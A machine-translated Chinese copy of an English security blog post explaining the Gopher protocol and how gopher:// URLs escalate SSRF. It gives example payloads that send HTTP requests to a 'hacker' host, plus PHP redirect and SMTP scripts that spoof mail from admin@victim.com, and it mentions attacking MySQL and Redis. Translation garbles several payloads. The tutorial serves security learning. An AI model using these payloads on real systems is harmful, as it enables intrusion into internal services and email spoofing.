<html>
<head>
<title>How Gopher works in escalating SSRFs</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Gopher如何在逐步升级的SSRFs中工作</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630?source=collection_archive---------0-----------------------#2021-07-02">https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630?source=collection_archive---------0-----------------------#2021-07-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/b8c83f82893017206be611f25b100690.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ru07UkIbhOhK1Y1BRVuvTg.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">来源:谷歌</figcaption></figure><p id="ca57" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们都知道HTTP和HTTPS，但有多少人见过野生的地鼠呢？我们经常用它来绕过和升级服务器端的请求伪造。好吧，信不信由你，Gopher是在1991年作为互联网上第一个运行在TCP/IP网络之上的数据/文件访问协议而被构想出来的。所以，这个博客是基于理解和它在野外的使用:)</p><p id="64d6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在我们了解Gopher如何工作之前，理解它实际上是什么以及它与HTTP和HTTPS有什么不同是非常重要的。Gopher是一种应用层协议，能够提取和查看存储在远程Web服务器上的Web文档。当它出现时，它是为在IP网络中分发、搜索和检索文档而设计的。Gopher的设计功能和外观都很像一个可挂载的只读全局，任何可以在<a class="ae la" href="https://en.wikipedia.org/wiki/CD-ROM" rel="noopener ugc nofollow" target="_blank"> <strong class="ke ir"> CD-ROM </strong> </a>上完成的数据文件都可以在Gopher上完成。一个地鼠系统由一系列<strong class="ke ir">层级超链接菜单</strong>组成。菜单项和标题的选择由服务器管理员控制。如果你想对它进行深度阅读，可以在这里找到:- <a class="ae la" href="https://en.wikipedia.org/wiki/Gopher_(protocol)" rel="noopener ugc nofollow" target="_blank"> <strong class="ke ir"> <em class="lb"> Gopher协议</em> </strong> </a> <strong class="ke ir"> <em class="lb">。</em> </strong></p><p id="7a7c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">现在，让我们看看它是如何工作的。Gopher类似于另一种互联网协议，<a class="ae la" href="https://en.wikipedia.org/wiki/File_Transfer_Protocol" rel="noopener ugc nofollow" target="_blank">文件传输协议</a> (FTP)，因为它通过TCP/IP互联网(如互联网)远程访问文件。但是，虽然一个FTP站点只存在于一台服务器上，并且可以有许多不同的FTP站点，但实际上只有一个分布式Gopher文件系统。这是它的主要区别。Gopher文件系统是世界上所有Gopher服务器的单一集合。每个Gopher服务器都可以作为分层分布式文件系统的根。为了访问文件或文档，使用Gopher客户机的人键入可访问的Gopher服务器的URL。查看下图以更好地理解它:</p><figure class="ld le lf lg gt jr gh gi paragraph-image"><div class="gh gi lc"><img src="../Images/be1232f73919334e8df98d357fed7cd2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/1*E5wgwthDL_cPEjj7Ec7jfQ.gif"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">来源:谷歌</figcaption></figure><p id="85e9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">可以实现多个数据包的整合传输，然后由gopher服务器将多个数据包捆绑发送给客户端。这是它的菜单响应。例如，使用gopher协议的curl命令可以操作mysql数据库或完成对redis的攻击。gopher协议使用tcp进行可靠的连接。Gopher可访问的信息作为文件存储在<strong class="ke ir"> Gopher服务器</strong>上。它以类似于计算机(如Windows PC或UNIX工作站)的文件系统树的分层方式进行组织。正如文件系统由包含文件和子目录(子文件夹)的顶级目录(或文件夹)组成一样，Gopher服务器将信息呈现为包含资源(如文件)的顶级目录和/或包含附加资源的子目录。通过在彼此的资源层次结构中提及不同服务器上的资源，可以使用将它们链接在一起。也有可能创建“虚拟”资源，就像它们是文件一样，例如允许搜索Gopher服务器的程序。gopher url格式是:</p><p id="a9c4" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">地鼠://:/ </strong></p><p id="5c2f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">它是用于表示url资源类型的单个字符。在常见的安全测试中发现，不管这个字符是什么，都无所谓，只要有就行。可以理解为http协议的前身或者简化版。<strong class="ke ir">虽然它很古老，但现在许多图书馆都支持gopher协议，而且gopher协议非常强大。</strong></p><p id="51a9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">现在，我们将看到Gopher如何方便地利用SSRFs。你一定见过SSRF的有效载荷是这样的:</p><p id="bbbb" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">地鼠://127 . 0 . 0 . 1:1337/_ SSRF % 0a测试！</strong></p><p id="b6c6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">使用这个协议，您可以指定您希望监听器<strong class="ke ir">发送</strong>的<strong class="ke ir"> ip、端口和字节</strong>。然后，你基本上可以利用一个SSRF来<strong class="ke ir">与任何TCP服务器</strong>通信(显然你需要先知道如何与服务对话)。gopher协议支持发送get和post请求:可以先截取GET请求包和POST请求包，形成符合gopher协议的请求。gopher协议是ssrf应用中最强大的协议。</p><p id="f56d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这里有一个例子，如果应用程序以某种方式使用Mysql数据库，你很有可能在Gopher的帮助下利用SSRF。<strong class="ke ir">原因？</strong> MySQL数据库用户认证采用挑战/响应模式。服务器生成挑战号并将其发送给客户端。客户端用挑战号加密密码，并返回相应的结果。然后服务器检查结果是否与预期的相同，从而完成用户认证过程。登录需要服务器发送的加密密码，但是当数据库用户密码为空时，加密密码也为空。客户端发送给服务器的认证包是相对固定的。这样就不需要交互了，可以通过gopher协议发送:)</p><p id="706e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">有了它，<strong class="ke ir">我们可以使用gopher://与MySQL数据库</strong>进行通信。因此，一旦你做了一些侦察，并意识到你有一个Mysql，你可以绑定不同有效载荷的Gopher来监听。一些例子是:</p><ul class=""><li id="6e30" class="lh li iq ke b kf kg kj kk kn lj kr lk kv ll kz lm ln lo lp bi translated"><strong class="ke ir">带HTTP的地鼠:</strong></li></ul><pre class="ld le lf lg gt lq lr ls lt aw lu bi"><span id="27f6" class="lv lw iq lr b gy lx ly l lz ma">gopher://yourproxyserver:8080/_GET http://hacker:80&gt;/x HTTP/1.1%0A%0A</span><span id="1170" class="lv lw iq lr b gy mb ly l lz ma">gopher://yourproxyserver:8080/_POST%20http://hacker:80/x%20HTTP/1.1%0ACookie:%20hacked%0A%0Ayou+are+hacked</span></pre><ul class=""><li id="60a6" class="lh li iq ke b kf kg kj kk kn lj kr lk kv ll kz lm ln lo lp bi translated"><strong class="ke ir">带SMTP的地鼠:</strong></li></ul><pre class="ld le lf lg gt lq lr ls lt aw lu bi"><span id="8382" class="lv lw iq lr b gy lx ly l lz ma">&lt;?php</span><span id="77b0" class="lv lw iq lr b gy mb ly l lz ma">header(“Location: gopher://yoursite:1337/_SSRF%0ATest!”);</span><span id="0dac" class="lv lw iq lr b gy mb ly l lz ma">?&gt;</span></pre><p id="1d45" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">在</strong>上查询:</p><p id="7438" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">https://anysite.com/?q = http://hacker . com/redirect . PHP。</p><ul class=""><li id="e8ba" class="lh li iq ke b kf kg kj kk kn lj kr lk kv ll kz lm ln lo lp bi translated"><strong class="ke ir">你也可以像这样使用它，它也会发送一封邮件:</strong></li></ul><pre class="ld le lf lg gt lq lr ls lt aw lu bi"><span id="4509" class="lv lw iq lr b gy lx ly l lz ma">&lt;?php<br/>        $commands = array(<br/>                'HELO victim.com',<br/>                'MAIL FROM: &lt;admin@victim.com&gt;',<br/>                'RCPT To: &lt;sxcurity@oou.us&gt;',<br/>                'DATA',<br/>                'Subject: @sxcurity!',<br/>                'Corben was here, woot woot!',<br/>                '.'<br/>        );        $payload = implode('%0A', $commands);        header('Location: gopher://0:25/_'.$payload);<br/>?&gt;</span></pre><p id="31e1" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这些是互联网上的一些例子，这完全取决于你如何利用它。无论如何，Gopher在利用SSRFs方面确实很方便，在阅读本文之后，如果您看到类似的案例，您可能会想进一步利用它。github上有一个很棒的工具，可以帮助你生成Gopher链接，在这种情况下非常有用。我更喜欢手工测试，但是你可以随时检查什么更适合你。下面是链接:<a class="ae la" href="https://github.com/tarunkant/Gopherus" rel="noopener ugc nofollow" target="_blank"> <strong class="ke ir"> Gopherus </strong> </a>。</p><p id="f40b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我希望你能从这个博客中得到一些新的东西，因为几个星期以来我一直在考虑写点什么。如果你喜欢这个博客，分享它，让人们知道一些新的东西。这将是这一个，我有更多的博客想法，正在努力:)如果你对这个博客或我的任何博客有任何疑问或建议，请随时在<a class="ae la" href="http://twitter.com/manasH4rsh" rel="noopener ugc nofollow" target="_blank"> <strong class="ke ir"> Twitter </strong> </a>上ping我。我真的很感谢你们给我的建议:)再见！</p><p id="afbf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">注意安全，祝黑客愉快:)</p><p id="4c80" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">再见，❤</p></div></div>    
</body>
</html>